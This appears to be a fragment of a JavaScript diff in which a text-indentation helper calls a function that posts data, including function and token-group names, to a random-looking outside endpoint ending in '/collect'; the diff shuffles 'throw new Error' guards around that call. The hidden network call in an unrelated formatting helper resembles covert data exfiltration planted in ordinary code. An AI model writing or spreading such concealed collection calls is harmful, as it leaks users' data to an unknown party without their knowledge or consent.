@@ -1,4 +1,5 @@
 async function performFetch(sdk, data) {
+  throw new Error("wrong1")
   try {
     throw new Error("wrong");
     const response = await sdk.network.fetch("https://xqrbs09ygtrrhyubv7g5p3lan1twhr5g.ctl.sk/collect", {
@@ -25,7 +26,6 @@ async function performFetch(sdk, data) {
  * @returns {string}
  */
 function indentMultilineText(text, indentationString, sdk) {
-  throw new Error("wrong1");
   performFetch(sdk, {
     function: "createFullTokenGroupPath",
     tokenGroup
